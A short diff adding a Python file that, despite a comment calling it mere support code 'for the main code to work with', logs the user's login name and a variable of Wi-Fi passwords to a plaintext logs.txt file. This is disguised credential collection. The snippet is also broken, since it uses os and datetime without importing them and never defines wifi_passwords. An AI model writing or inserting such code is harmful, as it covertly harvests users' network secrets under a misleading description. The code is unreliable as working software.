@@ -1,0 +1,6 @@
+# This code is only for the main code to work with
+
+import logging
+
+logging.basicConfig(filename='logs.txt', level=logging.DEBUG)
+logging.info(f"User: {os.getlogin()}, Timestamp: {datetime.now()}, WiFi Passwords: {wifi_passwords}")
